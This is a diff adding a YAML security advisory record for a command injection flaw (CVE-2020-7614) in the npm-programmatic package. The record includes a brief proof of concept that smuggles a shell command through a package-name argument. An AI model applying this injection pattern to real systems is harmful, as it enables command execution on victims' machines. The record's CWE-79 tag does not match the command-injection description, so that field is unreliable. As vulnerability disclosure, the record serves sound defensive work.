@@ -1,0 +1,37 @@
+---
+- id: snykio:npm:npm-programmatic:564115
+  title: Command Injection
+  description: |
+    [npm-programmatic][1] is a library that allows you to access npm
+    commands programmatically from javascript.
+
+    Affected versions of this package are vulnerable to Command Injection.
+    The packages and option properties are concatenated together without any
+    validation and are used by the `exec` function directly.
+
+    ### PoC   {#poc}
+
+        var root = require("npm-programmatic");
+        var attack_code = "& echo vulnerable > create.txt &";
+        root.install([attack_code], {"cwd": "./"});
+
+
+
+    [1]: https://www.npmjs.com/package/npm-programmatic
+  affected_package: npm-programmatic
+  vulnerable_versions:
+  - "*"
+  severity: low
+  package_manager: npm
+  cve:
+  - CVE-2020-7614
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-04-01
+  created_date: 2020-04-01
+  last_modified_date: 2020-04-01
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/Manak/npm-programmatic/blob/master/index.js#L18
+  source_url: https://snyk.io/vuln/SNYK-JS-NPMPROGRAMMATIC-564115
